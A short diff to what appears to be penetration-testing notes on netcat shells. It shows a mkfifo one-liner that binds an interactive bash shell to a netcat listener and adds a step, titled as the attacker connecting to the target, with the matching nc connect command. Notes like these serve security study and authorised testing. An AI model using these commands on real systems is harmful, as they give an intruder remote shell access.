@@ -24,3 +24,8 @@ nc -nv <TARGET IP> <PORT>
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <PORT> > /tmp/f
 ```
+
+#### 2) Attacker connects to target
+```bash
+nc -nv <TARGET IP> <PORT>
+```
